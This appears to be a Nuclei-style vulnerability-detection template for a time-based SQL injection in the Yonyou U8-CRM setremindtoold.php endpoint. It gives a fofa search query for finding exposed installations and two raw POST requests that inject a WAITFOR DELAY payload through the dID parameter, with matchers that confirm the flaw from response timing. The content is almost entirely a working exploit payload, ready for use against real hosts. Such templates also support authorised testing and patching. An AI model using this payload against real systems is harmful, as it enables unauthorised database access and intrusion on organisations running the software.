id: poc-yaml-yongyon-u8-crm-setremindtoold-sqli
info:
  name: "用友 U8-CRM setremindtoold.php 存在 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 用友 U8-CRM
  metadata:
    finger: 用友U8+CRM
    fofa: title="用友U8CRM"

http:
  - raw:
      - |
        POST /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:5'-- HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
      - |
        POST /ajax/setremindtoold.php?dID=1;WAITFOR+DELAY+'0:0:8'-- HTTP/1.1
        Host: {{Hostname}}
        Cookie: PHPSESSID=bgsesstimeout-;
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "1"
        part: body
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
